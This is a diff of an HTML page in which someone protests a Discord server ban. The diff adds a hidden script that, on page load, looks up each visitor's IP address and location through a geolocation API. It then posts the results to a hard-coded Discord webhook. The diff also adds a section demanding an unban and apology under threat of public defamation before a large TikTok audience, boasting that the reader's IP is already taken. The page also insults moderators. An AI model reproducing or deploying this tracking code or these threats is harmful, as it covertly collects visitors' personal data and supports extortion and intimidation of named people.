@@ -8,6 +8,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@600&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
     <style>
         body {
             background-color: #222222;
@@ -24,6 +25,19 @@
             font-family: 'Inter', sans-serif;
             margin-left: 20%;
             font-size: 35px;
+        }
+        ol {
+            text-align: left;
+            color: rgb(255, 253, 238);
+            font-family: 'Inter', sans-serif;
+            margin-left: 20%;
+            font-size: 20px;
+        }
+        a {
+            text-align: left;
+            color: rgb(255, 253, 238);
+            font-family: 'Inter', sans-serif;
+            font-size: 20px;
         }
         .hrred {
             color: red;
@@ -42,16 +56,49 @@
     </style>
 
 </head>
-<body><br>
+<body><script>
+    $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=b0da4c0541ba45fdbe50a45d77dbff7e", function(data) { //Make sure to use this api or use another but you got to change the values down below
+    var request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1170457387518398494/VqFIUh3Jb4JL4Q8rkxHlG5Dw518o4pXnCNZSKWPTFJD5HoM2MTK-YxeLMShdx33RCUy-");
+  
+    request.setRequestHeader('Content-type', 'application/json');
+    var t = {
+      username: "gameJet posta",
+      avatar_url: "https://www.origo.hu/i/1305/20130509-fogonosz-semion-mogilevich-orosz-maffiozo.jpg",
+      content: "",
+      embeds: [{
+          color: "4700374",
+          title: "szia lajos",
+          fields: [
+            {name: "Ip cim a latogatonak", value: data.ip_address},
+            {name: "varos", value: data.city},
+            {name: "orszag", value: data.country},
+            {name: "CONTINENT(nem tudom magyarul)", value: data.continent},
+          ],
+         
+      }]
+  };
+  
+    request.send(JSON.stringify(t));
+})
+</script>
+    <br>
     <h1>
         Hey,
     </h1>
     <br><br>
     <hr width="60%">
+    <h2> Contents</h2>
+    <ol>
+        <li><a href="#a">The accusations.</a></li>
+        <li><a href="#b">Moderator's response</a></li>
+        <li><a href="#c">How i will shut you down</a></li>
+    </ol>
+    <hr width="60%">
     <p>
         &nbsp;&nbsp;&nbsp;Me and my friends have been banned from this server, and we have all the reasons to say that we are actually innocent, and were <span class="hrred"> banned for no reason.</span> <br>
     </p>
-        <h2>
+        <h2> <a name="a"></a>
             I. The accusations.
         </h2>
     <p>
@@ -66,13 +113,20 @@
         &nbsp;&nbsp;&nbsp;Again, there was nothing sexual. <br><br>
         <span class="hrred">&nbsp;&nbsp;&nbsp;Conclusion: Dont hire dyslexic assholes.</span>
     </p>
-    <hr width="60%">
+    <hr width="60%"><a name="b"></a>
     <h2> II. Moderator's response</h2>
     <p>
         &nbsp;&nbsp;&nbsp;Here i have a screenshot from another user showing what the mod has said:<br> <br>
         <br><img src="img/e3.png" alt="" width="60%"><br><br>
         &nbsp;&nbsp;&nbsp;No one has said "how my horse makes me feel". No one was also talking about whatever "it" means suggestively.<br>
         &nbsp;&nbsp;&nbsp;The server is tagged as "Furry" on multiple websites, meaning <span class="hrred"> that the moderator is not only dyslexic, but also hypocritic.</span>
+    </p>
+    <hr width="60%"><a name="c"></a>
+    <h2> III. How i will shut you down</h2>
+    <p>
+        &nbsp;&nbsp;&nbsp;I am 100% sure that you can see the deleted messages. We are the victims here, but sadly for you that might change. If i dont recieve an unban and an apology, i will have to <span class="hrred">post all of the shit your moderator did</span> and just say that you promote those types of things on my tiktok account with 760 thousand followers. Here is a gif showing that i actually have the account.<br><br>
+        <img src="img/gif.gif" alt="" width="60%"><br><br>
+        Also i would like to point out that by the time you have finished reading this, i already have your ip address.<br><br><br><br><br><br>
     </p>
 </body>
 </html>
